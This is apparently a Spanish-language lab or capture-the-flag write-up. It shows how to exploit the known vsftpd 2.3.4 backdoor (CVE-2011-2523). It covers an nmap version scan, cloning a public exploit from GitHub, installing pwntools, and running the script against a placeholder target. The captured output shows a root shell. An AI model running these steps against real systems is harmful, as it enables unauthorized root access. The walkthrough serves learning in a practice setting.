# FirstHacking
## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sV -p 21 <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `21/tcp open ftp vsftpd 2.3.4`: El puerto 21 está abierto y ejecuta el servidor FTP vsftpd versión 2.3.4.

Esta versión específica es crítica, ya que es conocida por contener una puerta trasera ("backdoor") introducida maliciosamente en el código fuente original (CVE-2011-2523).

## 2. Explotación del Servicio FTP

La vulnerabilidad en `vsftpd 2.3.4` se activa al enviar una cara sonriente `:)` en el nombre de usuario, lo que abre una shell de escucha en el puerto 6200.

### 2.1. Obtención del Exploit

Para automatizar el proceso, utilizamos un exploit público disponible en GitHub.

```bash
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit
cd vsftpd_2.3.4_Exploit
```

### 2.2. Gestión de Dependencias (Entorno Virtual)

El exploit requiere la librería `pwntools`. Para mantener el sistema limpio y evitar conflictos de versiones, configuramos un entorno virtual de Python.

```bash
# 1. Crear el entorno virtual
python3 -m venv venv

# 2. Activar el entorno
source venv/bin/activate

# 3. Instalar la dependencia necesaria
pip install pwntools
```

### 2.3. Ejecución del Exploit

Con el entorno configurado, ejecutamos el script apuntando al objetivo.

```bash
python3 exploit.py <IP_DEL_OBJETIVO>
```

**Salida Exitosa:**

El script interactúa con el servicio FTP, detona el backdoor y establece una conexión con la shell reversa.

Plaintext

```bash
[+] Got Shell!!!
[+] Opening connection to <IP_DEL_OBJETIVO> on port 21: Done
[*] Closed connection to <IP_DEL_OBJETIVO> port 21
[+] Opening connection to <IP_DEL_OBJETIVO> on port 6200: Done
[*] Switching to interactive mode
$
```

### 2.4. Verificación de Acceso

Confirmamos el nivel de privilegios obtenidos en la máquina comprometida.

```bash
whoami
# root
```
